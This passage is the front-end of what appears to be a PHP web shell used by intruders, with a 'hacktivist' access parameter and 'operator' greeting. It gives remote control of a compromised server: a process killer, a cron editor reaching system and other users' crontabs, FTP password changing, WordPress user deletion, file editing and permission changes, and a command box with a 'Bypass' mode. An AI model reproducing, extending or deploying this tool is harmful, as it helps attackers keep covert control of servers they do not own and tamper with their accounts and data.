                <button class="btn btn-sm btn-danger" id="wpDeleteConfirmBtn" onclick="wpConfirmDelete()">Delete</button>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>

<!-- Process Manager Modal -->
<div class="modal-overlay hidden" id="procModal">
    <div class="modal" style="max-width: 1100px; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <span class="modal-title" style="color: #ec4899;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
                Process Manager
                <span id="procLiveIndicator" style="display:inline-block;width:8px;height:8px;background:#3fb950;border-radius:50%;margin-left:8px;animation:procPulse 1s infinite;vertical-align:middle;"></span>
                <span style="font-size:10px;color:#3fb950;margin-left:4px;font-weight:400;">LIVE</span>
            </span>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="procStats" style="font-size:10px;color:var(--text-muted);"></span>
                <button class="btn btn-sm btn-secondary" onclick="procTogglePause()" id="procPauseBtn" style="padding:3px 10px;font-size:10px;">Pause</button>
                <button class="modal-close" onclick="procStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
            </div>
        </div>
        <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column; padding: 10px 14px;">
            <!-- Filter + Search -->
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
                <input type="text" id="procSearch" class="form-input" placeholder="Search process..." style="flex:1;min-width:150px;padding:5px 10px;font-size:11px;" oninput="procFilterRender()">
                <select id="procFilter" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
                    <option value="all">All Processes</option>
                    <option value="mine">My Processes</option>
                    <option value="hidden">Hidden Only</option>
                    <option value="recent">Recent (5min)</option>
                </select>
                <select id="procSort" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
                    <option value="cpu">Sort: CPU</option>
                    <option value="mem">Sort: MEM</option>
                    <option value="pid">Sort: PID</option>
                    <option value="start">Sort: Start</option>
                </select>
            </div>

            <!-- Alert badges -->
            <div id="procAlerts" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;"></div>

            <!-- Process table -->
            <div style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead>
                        <tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">PID</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">USER</th>
                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">CPU%</th>
                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">MEM%</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">STAT</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">START</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">COMMAND</th>
                            <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="procTableBody">
                        <tr><td colspan="8" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<style>
@keyframes procPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
.proc-row:hover { background: rgba(236,72,153,0.06) !important; }
.proc-hidden { border-left: 3px solid #f85149 !important; background: rgba(248,81,73,0.06) !important; }
.proc-recent { border-left: 3px solid #3fb950 !important; background: rgba(63,185,80,0.06) !important; }
.proc-high-cpu { color: #f85149 !important; font-weight: 700; }
.proc-high-mem { color: #f97316 !important; font-weight: 700; }
</style>

<!-- Process Kill Confirm -->
<div class="modal-overlay hidden" id="procKillModal" style="z-index: 1001;">
    <div class="modal" style="max-width: 380px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f85149;">Kill Process</span>
            <button class="modal-close" onclick="hideModal('procKill')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color:var(--text-muted);font-size:12px;">Kill PID <strong id="procKillPid" style="color:#f85149;"></strong>?</p>
            <p id="procKillCmd" style="color:var(--text-muted);font-size:10px;font-family:monospace;word-break:break-all;margin-top:4px;"></p>
            <div style="display:flex;gap:6px;margin-top:12px;justify-content:flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('procKill')">Cancel</button>
                <button class="btn btn-sm" style="background:#f97316;border-color:#f97316;color:#fff;" onclick="procDoKill('15')">SIGTERM</button>
                <button class="btn btn-sm btn-danger" onclick="procDoKill('9')">SIGKILL</button>
            </div>
        </div>
    </div>
</div>

<!-- Cronjob Manager Modal -->
<div class="modal-overlay hidden" id="cronModal">
    <div class="modal" style="max-width: 1050px; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <span class="modal-title" style="color: #06b6d4;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                Cronjob Manager
                <span id="cronLiveIndicator" style="display:inline-block;width:8px;height:8px;background:#3fb950;border-radius:50%;margin-left:8px;animation:cronPulse 1s infinite;vertical-align:middle;"></span>
                <span style="font-size:10px;color:#3fb950;margin-left:4px;font-weight:400;">LIVE</span>
            </span>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="cronStats" style="font-size:10px;color:var(--text-muted);"></span>
                <button class="btn btn-sm btn-secondary" onclick="cronTogglePause()" id="cronPauseBtn" style="padding:3px 10px;font-size:10px;">Pause</button>
                <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;padding:3px 10px;font-size:10px;" onclick="cronToggleRaw()" id="cronRawBtn">Raw Edit</button>
                <button class="modal-close" onclick="cronStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
            </div>
        </div>
        <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column; padding: 10px 14px;">
            <!-- Add new cron -->
            <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
                <select id="cronPreset" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="cronApplyPreset()">
                    <option value="">Schedule preset...</option>
                    <option value="* * * * *">Every minute</option>
                    <option value="*/5 * * * *">Every 5 min</option>
                    <option value="*/15 * * * *">Every 15 min</option>
                    <option value="*/30 * * * *">Every 30 min</option>
                    <option value="0 * * * *">Every hour</option>
                    <option value="0 */6 * * *">Every 6 hours</option>
                    <option value="0 */12 * * *">Every 12 hours</option>
                    <option value="0 0 * * *">Daily midnight</option>
                    <option value="0 0 * * 0">Weekly Sunday</option>
                    <option value="0 0 1 * *">Monthly 1st</option>
                    <option value="@reboot">On reboot</option>
                </select>
                <input type="text" id="cronSchedule" class="form-input" placeholder="* * * * *" style="width:120px;padding:5px 8px;font-size:11px;font-family:monospace;">
                <input type="text" id="cronCommand" class="form-input" placeholder="Command to run..." style="flex:1;min-width:200px;padding:5px 8px;font-size:11px;font-family:monospace;">
                <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;padding:5px 12px;font-size:11px;" onclick="cronAdd()">Add</button>
            </div>

            <!-- Tabs -->
            <div style="display:flex;gap:4px;margin-bottom:8px;">
                <button class="btn btn-sm btn-secondary" id="cronTabUser" onclick="cronSwitchTab('user')" style="padding:3px 10px;font-size:10px;border-color:#06b6d4;color:#06b6d4;">My Crontab</button>
                <button class="btn btn-sm btn-secondary" id="cronTabSys" onclick="cronSwitchTab('sys')" style="padding:3px 10px;font-size:10px;">System Crons</button>
                <button class="btn btn-sm btn-secondary" id="cronTabOther" onclick="cronSwitchTab('other')" style="padding:3px 10px;font-size:10px;">Other Users</button>
            </div>

            <!-- Raw editor (hidden by default) -->
            <div id="cronRawEditor" style="display:none;margin-bottom:8px;">
                <textarea id="cronRawText" class="form-input" style="width:100%;height:150px;font-family:monospace;font-size:11px;padding:8px;resize:vertical;background:var(--bg-secondary);color:var(--text-primary);border:1px solid var(--border);border-radius:6px;" placeholder="# Edit crontab raw content..."></textarea>
                <div style="display:flex;gap:6px;margin-top:6px;justify-content:flex-end;">
                    <button class="btn btn-sm btn-secondary" onclick="cronToggleRaw()" style="font-size:10px;">Cancel</button>
                    <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;font-size:10px;" onclick="cronSaveRaw()">Save Crontab</button>
                </div>
            </div>

            <!-- User crontab table -->
            <div id="cronUserTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead><tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);width:30px;">#</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Status</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Schedule</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">Command</th>
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Actions</th>
                    </tr></thead>
                    <tbody id="cronUserBody"><tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr></tbody>
                </table>
            </div>

            <!-- System crons -->
            <div id="cronSysTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;display:none;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead><tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Directory</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">File</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">Content</th>
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Writable</th>
                    </tr></thead>
                    <tbody id="cronSysBody"></tbody>
                </table>
            </div>

            <!-- Other users -->
            <div id="cronOtherTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;display:none;">
                <div id="cronOtherBody" style="padding:10px;color:var(--text-muted);font-size:11px;">Loading...</div>
            </div>

            <!-- /etc/crontab -->
            <div id="cronEtcSection" style="margin-top:8px;">
                <div style="font-size:10px;color:var(--text-muted);font-weight:600;margin-bottom:4px;">/etc/crontab</div>
                <pre id="cronEtcContent" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:6px;padding:8px;font-size:10px;color:var(--text-primary);max-height:100px;overflow:auto;margin:0;white-space:pre-wrap;word-break:break-all;"></pre>
            </div>
        </div>
    </div>
</div>
<style>
@keyframes cronPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
.cron-row:hover { background: rgba(6,182,212,0.06) !important; }
.cron-disabled { opacity: 0.5; }
.cron-var { color: #f97316 !important; font-style: italic; }

/* === TOAST NOTIFICATIONS === */
#toastContainer {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 99999;
    display: flex;
    flex-direction: column;
    gap: 10px;
    pointer-events: none;
}
.toast-item {
    pointer-events: auto;
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 300px;
    max-width: 460px;
    padding: 12px 16px;
    border-radius: 10px;
    font-size: 12px;
    font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
    color: #fff;
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
    transform: translateX(120%);
    opacity: 0;
    animation: toastSlideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    transition: transform 0.2s, box-shadow 0.2s;
    overflow: hidden;
}
.toast-item:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.08); }
.toast-item.toast-removing { animation: toastSlideOut 0.35s cubic-bezier(0.55, 0, 1, 0.45) forwards; }

.toast-success {
    background: linear-gradient(135deg, rgba(22, 163, 74, 0.92), rgba(16, 120, 56, 0.92));
    border-left: 4px solid #3fb950;
}
.toast-error {
    background: linear-gradient(135deg, rgba(220, 38, 38, 0.92), rgba(160, 28, 28, 0.92));
    border-left: 4px solid #f85149;
}
.toast-warning {
    background: linear-gradient(135deg, rgba(234, 179, 8, 0.92), rgba(180, 130, 0, 0.92));
    border-left: 4px solid #ffd700;
}
.toast-info {
    background: linear-gradient(135deg, rgba(6, 142, 182, 0.92), rgba(8, 100, 136, 0.92));
    border-left: 4px solid #06b6d4;
}
.toast-icon {
    flex-shrink: 0;
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    background: rgba(255,255,255,0.15);
}
.toast-body { flex: 1; min-width: 0; }
.toast-title { font-weight: 700; font-size: 12px; margin-bottom: 2px; letter-spacing: 0.3px; }
.toast-msg { font-size: 11px; opacity: 0.85; line-height: 1.4; word-break: break-word; }
.toast-progress {
    position: absolute;
    bottom: 0;
    left: 0;
    height: 3px;
    background: rgba(255,255,255,0.35);
    border-radius: 0 0 0 10px;
    animation: toastProgress linear forwards;
}
.toast-close {
    flex-shrink: 0;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    border: none;
    background: rgba(255,255,255,0.12);
    color: rgba(255,255,255,0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    line-height: 1;
    transition: background 0.15s;
}
.toast-close:hover { background: rgba(255,255,255,0.25); }
@keyframes toastSlideIn { 0% { transform: translateX(120%); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
@keyframes toastSlideOut { 0% { transform: translateX(0); opacity: 1; } 100% { transform: translateX(120%); opacity: 0; } }
@keyframes toastProgress { 0% { width: 100%; } 100% { width: 0%; } }

/* PHP-rendered message bars (hidden by JS, fallback display) */
.msg-success, .msg-error {
    padding: 10px 14px;
    border-radius: 8px;
    font-size: 12px;
    margin-bottom: 12px;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    animation: msgFadeIn 0.3s ease;
}
.msg-success {
    background: rgba(63, 185, 80, 0.12);
    border: 1px solid rgba(63, 185, 80, 0.3);
    color: #3fb950;
}
.msg-error {
    background: rgba(248, 81, 73, 0.12);
    border: 1px solid rgba(248, 81, 73, 0.3);
    color: #f85149;
}
@keyframes msgFadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
</style>

<!-- Cursor Resize Script -->
<script>
(function(){
    var CURSOR_SIZE = 28;
    var POINTER_SIZE = 32;
    var cursorUrls = {
        normal: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/One%20Piece%20Straw%20Hat%20Arrow%20%26%20Flag--cursor--SweezyCursors-o3Qgq3asy9Pci7U7MuEyX3tiYXLMLP.png',
        pointer: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/One%20Piece%20Straw%20Hat%20Arrow%20%26%20Flag--pointer--SweezyCursors-NInXA1EgCwjgfLQPGIIESrsnf3QDdF.png'
    };
    function resizeCursor(url, size, hotX, hotY, cb) {
        var img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = function() {
            var c = document.createElement('canvas');
            c.width = size; c.height = size;
            var ctx = c.getContext('2d');
            ctx.drawImage(img, 0, 0, size, size);
            cb(c.toDataURL('image/png'), hotX, hotY);
        };
        img.onerror = function() { cb(null); };
        img.src = url;
    }
    resizeCursor(cursorUrls.normal, CURSOR_SIZE, 4, 2, function(dataUrl) {
        if (!dataUrl) return;
        var style = document.createElement('style');
        style.id = 'cursor-normal';
        style.textContent = '*, *::before, *::after { cursor: url("' + dataUrl + '") 4 2, default !important; }';
        document.head.appendChild(style);
        resizeCursor(cursorUrls.pointer, POINTER_SIZE, 8, 4, function(pUrl) {
            if (!pUrl) return;
            var s2 = document.createElement('style');
            s2.id = 'cursor-pointer';
            s2.textContent = 'a,button,[onclick],select,option,label,summary,'
                + 'input[type="submit"],input[type="button"],input[type="checkbox"],input[type="radio"],input[type="file"],'
                + '.btn,.btn-sm,.action-btns a,.modal-close,.toast-item,.toast-close,'
                + '.file-row:hover .action-btns a,.nav-link,.tab-btn,.breadcrumb a,'
                + '.file-checkbox,[role="button"],.upload-label'
                + '{ cursor: url("' + pUrl + '") 8 4, pointer !important; }';
            document.head.appendChild(s2);
        });
    });
})();
</script>

<!-- Toast Container -->
<div id="toastContainer"></div>

<script>
// === SOUND SYSTEM ===
var _sndUrls = {
    fbi: 'https://www.myinstants.com/media/sounds/fbi-open-up-sfx.mp3',
    applepay: 'https://www.myinstants.com/media/sounds/applepay.mp3',
    catlaugh: 'https://www.myinstants.com/media/sounds/cat-laught.mp3',
    fahhh: 'https://www.myinstants.com//media/sounds/fahhh_KcgAXfs.mp3'
};
var _sndPlaying = {};
function playSound(name) {
    if (_sndPlaying[name]) return;
    var url = _sndUrls[name];
    if (!url) return;
    _sndPlaying[name] = true;
    try {
        var audio = new Audio(url);
        audio.volume = 0.7;
        audio.onended = function() { _sndPlaying[name] = false; };
        audio.onerror = function() { _sndPlaying[name] = false; };
        var p = audio.play();
        if (p && p.catch) p.catch(function() { _sndPlaying[name] = false; });
        setTimeout(function() { _sndPlaying[name] = false; }, 10000);
    } catch(e) { _sndPlaying[name] = false; }
}
function playFailSound() {
    var fail = ['catlaugh', 'fahhh'];
    playSound(fail[Math.floor(Math.random() * fail.length)]);
}
// Preload sounds into browser cache via fetch
(function() {
    ['applepay','catlaugh','fahhh','fbi'].forEach(function(name) {
        try { fetch(_sndUrls[name], {mode:'cors'}).catch(function(){}); } catch(e){}
    });
})();

// === TOAST NOTIFICATION SYSTEM ===
var toastIcons = {
    success: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>',
    error: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
    warning: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
    info: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
};
var toastTitles = { success: 'Success', error: 'Error', warning: 'Warning', info: 'Info' };

function fileActionRequest(data, callback) {
    var form = new FormData();
    for (var key in data) { if (data.hasOwnProperty(key)) form.append(key, data[key]); }
    fetch(window.location.pathname + '?lastpiece=hacktivist', {
        method: 'POST', body: form
    }).then(function(r) { return r.json(); }).then(callback).catch(function(e) {
        callback({err: e.message || 'Network error'});
    });
}

function showToast(message, type, duration, sound) {
    type = type || 'success';
    duration = duration || 4000;
    if (sound) playSound(sound);
    var container = document.getElementById('toastContainer');
    var toast = document.createElement('div');
    toast.className = 'toast-item toast-' + type;
    toast.style.position = 'relative';
    toast.innerHTML = '<div class="toast-icon">' + (toastIcons[type] || toastIcons.info) + '</div>'
        + '<div class="toast-body"><div class="toast-title">' + toastTitles[type] + '</div><div class="toast-msg">' + message + '</div></div>'
        + '<button class="toast-close" onclick="removeToast(this.parentElement)">&times;</button>'
        + '<div class="toast-progress" style="animation-duration:' + duration + 'ms;"></div>';
    container.appendChild(toast);
    toast.addEventListener('click', function(e) { if (e.target.tagName !== 'BUTTON') removeToast(toast); });
    setTimeout(function() { removeToast(toast); }, duration);
}

function removeToast(el) {
    if (!el || el.classList.contains('toast-removing')) return;
    el.classList.add('toast-removing');
    setTimeout(function() { if (el.parentNode) el.parentNode.removeChild(el); }, 350);
}

// Page-load toast: check URL for msg param + PHP messages + login sound
var _pageToastFired = false;
(function() {
    var url = new URL(window.location.href);
    var msg = url.searchParams.get('msg');
    if (msg === 'deleted') {
        _pageToastFired = true;
        setTimeout(function() { showToast('Item deleted successfully', 'success', 4000, 'applepay'); }, 300);
        url.searchParams.delete('msg');
        window.history.replaceState({}, '', url.pathname + url.search);
    }

    // PHP-rendered messages -> toast with sound (skip if URL msg already fired)
    if (!_pageToastFired) {
        var successDiv = document.querySelector('.msg-success');
        if (successDiv) {
            var txt = successDiv.textContent.trim();
            successDiv.style.display = 'none';
            if (txt) { _pageToastFired = true; setTimeout(function() { showToast(txt, 'success', 5000, 'applepay'); }, 200); }
        }
    } else {
        var sd = document.querySelector('.msg-success'); if (sd) sd.style.display = 'none';
    }
    var errorDiv = document.querySelector('.msg-error');
    if (errorDiv) {
        var txt2 = errorDiv.textContent.trim();
        errorDiv.style.display = 'none';
        if (txt2) setTimeout(function() { showToast(txt2, 'error', 5000); playFailSound(); }, 200);
    }
})();

// FBI sound on first access (once per session, works with password and nopass)
<?php if ($justLoggedIn): ?>
(function() {
    setTimeout(function() {
        showToast('Access Granted. Welcome back, operator.', 'success', 6000, 'fbi');
    }, 600);
})();
<?php endif; ?>

function showModal(type) {
    document.getElementById(type + 'Modal').classList.remove('hidden');
    if (type === 'wp' && typeof wpLoadUsers === 'function') wpLoadUsers();
    if (type === 'ftp') ftpAutoLoad();
    if (type === 'proc') procStart();
    if (type === 'cron') cronStart();
}
function hideModal(type) { document.getElementById(type + 'Modal').classList.add('hidden'); }

var ftpLoaded = <?php echo (!empty($ftpAccounts) || isset($_POST['ftp_list'])) ? 'true' : 'false'; ?>;
function ftpAutoLoad() {
    if (ftpLoaded) return;
    ftpLoaded = true;
    var form = document.createElement('form');
    form.method = 'POST';
    form.style.display = 'none';
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = 'ftp_list';
    inp.value = '1';
    form.appendChild(inp);
    document.body.appendChild(form);
    form.submit();
}

var bypassMode = false;
function toggleBypass() {
    bypassMode = !bypassMode;
    var btn = document.getElementById('bypassToggle');
    var field = document.getElementById('useBypassField');
    var label = document.getElementById('cmdModeLabel');
    if (bypassMode) {
        btn.textContent = 'Bypass';
        btn.className = 'btn btn-sm btn-danger';
        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;background:#f85149;border-color:#f85149;color:#fff;';
        field.value = '1';
        label.textContent = '#';
        label.style.color = '#f85149';
    } else {
        btn.textContent = 'Normal';
        btn.className = 'btn btn-sm btn-secondary';
        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;';
        field.value = '0';
        label.textContent = '$';
        label.style.color = '';
    }
}

function ftpChgPass(user, domain) {
    var panels = document.querySelectorAll('[id^="ftpChg_"]');
    panels.forEach(function(p) { p.classList.add('hidden'); });
    for (var i = 0; i < 100; i++) {
        var el = document.getElementById('ftpChg_' + i);
        if (!el) break;
        var form = el.querySelector('form');
        if (form) {
            var uInput = form.querySelector('[name="ftp_chg_user"]');
            var dInput = form.querySelector('[name="ftp_chg_domain"]');
            if (uInput && dInput && uInput.value === user && dInput.value === domain) {
                el.classList.toggle('hidden');
                if (!el.classList.contains('hidden')) {
                    el.querySelector('[name="ftp_chg_pass"]').focus();
                }
                break;
            }
        }
    }
}

function showDeleteConfirm(path, name) {
    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
    document.getElementById('deleteConfirmBtn').href = '?del=' + path + '&lastpiece=hacktivist';
    document.getElementById('deleteConfirmModal').classList.remove('hidden');
}
function hideDeleteConfirm() { document.getElementById('deleteConfirmModal').classList.add('hidden'); }

// === AJAX helper for file operations ===
function fileActionRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.pathname, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            try { var r = JSON.parse(xhr.responseText); callback(r); }
            catch(e) { callback({err: 'Invalid response'}); }
        }
    };
    var params = [];
    for (var key in data) { params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key])); }
    xhr.send(params.join('&'));
}

// === EDIT FILE MODAL ===
function showEditModal(path) {
    document.getElementById('editFilePath').value = path;
    document.getElementById('editFileName').textContent = path.split('/').pop();
    document.getElementById('editLoading').style.display = '';
    document.getElementById('editFileContent').style.display = 'none';
    document.getElementById('editFileContent').value = '';
    document.getElementById('editSaveBtn').disabled = true;
    document.getElementById('editFileModal').classList.remove('hidden');
    fileActionRequest({file_action: 'get_content', file_path: path}, function(r) {
        document.getElementById('editLoading').style.display = 'none';
        if (r.err) {
            document.getElementById('editFileContent').style.display = '';
            document.getElementById('editFileContent').value = 'Error: ' + r.err;
        } else {
            document.getElementById('editFileContent').style.display = '';
            document.getElementById('editFileContent').value = r.content;
            document.getElementById('editSaveBtn').disabled = false;
        }
    });
}
function hideEditModal() { document.getElementById('editFileModal').classList.add('hidden'); }
function saveEditFile() {
    var path = document.getElementById('editFilePath').value;
    var content = document.getElementById('editFileContent').value;
    var btn = document.getElementById('editSaveBtn');
    btn.disabled = true;
    btn.textContent = 'Saving...';
    var saveBtnReset = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg> Save File';
    fileActionRequest({file_action: 'save_content', file_path: path, file_content: content}, function(r) {
        if (r.ok) {
            showToast('File saved successfully: <b>' + path.split('/').pop() + '</b>', 'success', 4000, 'applepay');
            btn.textContent = 'Saved!';
            btn.style.background = '#3fb950';
            btn.style.borderColor = '#3fb950';
            setTimeout(function() { btn.disabled = false; btn.innerHTML = saveBtnReset; btn.style.background = ''; btn.style.borderColor = ''; }, 1500);
        } else {
            showToast('Failed to save file: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
            btn.textContent = 'Error!';
            btn.style.background = '#f85149';
            btn.style.borderColor = '#f85149';
            setTimeout(function() { btn.disabled = false; btn.innerHTML = saveBtnReset; btn.style.background = ''; btn.style.borderColor = ''; }, 2000);
        }
    });
}

// === RENAME MODAL ===
function showRenameModal(path, name) {
    document.getElementById('renameFilePath').value = path;
    document.getElementById('renameCurrentName').textContent = name;
    document.getElementById('renameNewName').value = name;
    document.getElementById('renameModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('renameNewName').focus(); document.getElementById('renameNewName').select(); }, 100);
}
function hideRenameModal() { document.getElementById('renameModal').classList.add('hidden'); }
function doRename() {
    var path = document.getElementById('renameFilePath').value;
    var newName = document.getElementById('renameNewName').value.trim();
    if (!newName) { showToast('Please enter a new name', 'warning'); return; }
    fileActionRequest({file_action: 'rename', file_path: path, new_name: newName}, function(r) {
        if (r.ok) {
            showToast('Renamed to <b>' + newName + '</b> successfully', 'success', 4000, 'applepay');
            hideRenameModal();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Rename failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}

// === CHMOD MODAL ===
function showChmodModal(path, name, currentPerm) {
    document.getElementById('chmodFilePath').value = path;
    document.getElementById('chmodFileName').textContent = name;
    document.getElementById('chmodCurrentPerm').textContent = currentPerm;
    document.getElementById('chmodNewPerm').value = currentPerm;
    document.getElementById('chmodFileModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('chmodNewPerm').focus(); document.getElementById('chmodNewPerm').select(); }, 100);
}
function hideChmodFileModal() { document.getElementById('chmodFileModal').classList.add('hidden'); }
function doChmod() {
    var path = document.getElementById('chmodFilePath').value;
    var perm = document.getElementById('chmodNewPerm').value.trim();
    if (!perm || perm.length < 3 || perm.length > 4) { showToast('Please enter a valid permission (e.g. 0755)', 'warning'); return; }
    fileActionRequest({file_action: 'chmod', file_path: path, permission: perm}, function(r) {
